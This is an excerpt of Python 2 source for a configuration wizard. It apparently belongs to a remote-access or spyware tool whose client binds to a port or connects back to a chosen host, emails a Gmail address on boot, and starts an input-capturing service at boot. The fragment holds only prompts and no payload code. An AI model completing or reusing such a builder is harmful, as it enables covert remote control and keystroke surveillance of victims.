...
def create_new_config():
    ...
    while st_bind != "y" and st_bind != "yes" and st_bind != "n" and st_bind != "no":
        st_bind = raw_input('\nWould you like the client_app to bind itself? [Y/N]: ').lower()
    ...
    if BIND:
        st_bhost = raw_input('\nEnter the host IP you want the client_app to bind to. (Leave empty to allow all IPs): ').lower()
        BHOST = st_bhost

        st_bport = raw_input('Enter the port you want the client_app to bind itself to?: ').lower()
        while not check_int(st_bport):
            st_bport = raw_input('\nEnter the port you want the client_app to bind itself to?: ').lower()
        BPORT = st_bport
    else:
        BHOST = ""
        BPORT = ""
    ...
    while st_conn != "y" and st_conn != "yes" and st_conn != "n" and st_conn != "no":
        st_conn = raw_input('\nWould you like the client_app to connect to a host? [Y/N]:  ').lower()
    ...
    if LISTEN:
        st_chost = raw_input('\nEnter the host IP you want the client_app to connect to: ').lower()
        LHOST = st_chost

        st_cport = raw_input('Enter the port on "{}" that you want the client_app to connect to: '.format(st_chost)).lower()
    ...
    while st_email != "y" and st_email != "yes" and st_email != "n" and st_email != "no":
        st_email = raw_input('\nWould you like the client_app to email you on boot? [Y/N]:  ').lower()
    ...
    if EMAIL:
        while True:
            GMAIL_USER = raw_input('\nEnter a valid gmail address you want the client_app to use: ').lower()
    ...
    while st_klboot != "y" and st_klboot != "yes" and st_klboot != "n" and st_klboot != "no":
        st_klboot = raw_input('\nWould you like the input_service to start on boot? [Y/N]:  ').lower()
...
def get_conf_dir():
    i = 1
    while os.path.exists(os.path.join(client_apps_path,'config{}'.format(i))):
        i += 1
    conf_dir = os.path.join(client_apps_path,'config{}'.format(i))
